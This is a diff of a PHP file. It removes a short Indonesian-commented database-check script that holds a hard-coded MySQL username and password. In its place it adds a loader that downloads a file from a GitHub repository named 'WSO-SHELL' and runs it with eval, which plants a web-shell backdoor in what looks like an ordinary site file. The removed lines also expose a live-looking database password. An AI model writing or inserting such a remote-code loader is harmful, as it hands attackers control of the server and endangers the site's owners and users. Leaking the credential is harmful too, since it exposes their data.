@@ -1,39 +1,21 @@
 <?php
-// Koneksi ke MySQL pakai user global kamu
-$DB_HOST   = "localhost";
-$DB_USER   = "fasttrav_swidodocom";   // ganti kalau perlu
-$DB_PASSWD = "II^vDBwHRmZ&";          // password user
+$url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php";
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HEADER, true);
 
-$conn = new mysqli($DB_HOST, $DB_USER, $DB_PASSWD);
-if ($conn->connect_error) {
-    die("❌ Koneksi gagal: " . $conn->connect_error);
-}
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+$body = substr($response, $header_size);
 
-// Ambil semua database dengan prefix fasttrav_
-$sql = "SHOW DATABASES LIKE 'fasttrav\_%'";
-$result = $conn->query($sql);
-
-if ($result->num_rows > 0) {
-    echo "<pre>";
-    while ($row = $result->fetch_array()) {
-        $db = $row[0];
-        echo "🔍 Cek DB: $db ... ";
-
-        // Pilih DB ini
-        $conn->select_db($db);
-
-        // Cek apakah ada tabel theme
-        $check = $conn->query("SHOW TABLES LIKE 'theme'");
-        if ($check && $check->num_rows > 0) {
-            echo "✅ ADA tabel theme\n";
-        } else {
-            echo "❌ tidak ada tabel theme\n";
-        }
-    }
-    echo "</pre>";
+if (curl_errno($ch)) {
+    echo "cURL error: " . curl_error($ch);
+} elseif ($http_code != 200) {
+    echo "HTTP Error: $http_code";
 } else {
-    echo "Tidak ada database fasttrav_ ditemukan.";
+    eval("?>" . $body);
 }
 
-$conn->close();
+curl_close($ch);
 ?>
